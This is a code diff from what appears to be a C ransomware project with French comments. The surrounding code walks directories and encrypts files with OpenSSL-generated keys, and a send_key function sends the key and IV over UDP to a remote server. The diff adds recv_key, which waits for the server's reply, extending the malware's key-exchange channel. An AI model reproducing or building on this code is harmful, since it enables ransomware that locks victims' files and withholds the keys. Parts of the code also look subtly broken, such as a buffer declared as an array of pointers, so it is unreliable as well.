@@ -13,12 +13,14 @@
 
 #define OPENSSL_KEY_SIZE (256 / 8) //car Rand_bytes génère des bytes (octets) et pas bits
 #define OPENSSL_IV_SIZE (128 / 8)
+#define SIZE 1024
 
 void usage();
 int is_encrypted(char *filename);
 void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);
 int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);
 int send_key(char *pKey, char *pIv);
+int recv_key(int, struct sockaddr_in server_address);
 
 int is_encrypted(char *filename){
 	char *token = strtok(filename, ".");
@@ -84,7 +86,7 @@ void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_fl
 	closedir(dir);
 }
 
-int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
+int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv, char *pKey, char *pIv){
 	if (!RAND_bytes(key, OPENSSL_KEY_SIZE)) {
     	printf("OpenSSL reports a failure during key generation !");
 	}
@@ -116,6 +118,19 @@ int send_key(char *pKey, char *pIv){
 	snprintf(msg, sizeof(msg), "%s | %s", pKey, pIv);
 
 	sendto(sockid, (const char *)msg, strlen(msg), 0, (const struct sockaddr *) &server_addr, sizeof(server_addr));
+	
+	recv_key(sockid, server_addr);
+}
+
+int recv_key(int sockid, struct sockaddr_in server_addr){
+	int len = sizeof(server_addr);
+	char *buffer[SIZE];
+
+	printf("%s\n", inet_ntoa(server_addr.sin_addr));
+	printf("%d\n", server_addr.sin_port);
+
+	recvfrom(sockid, (char *)buffer, SIZE, MSG_WAITALL, (struct sockaddr *) &server_addr, &len);
+	printf("%s\n", buffer);
 
 	close(sockid);
 }
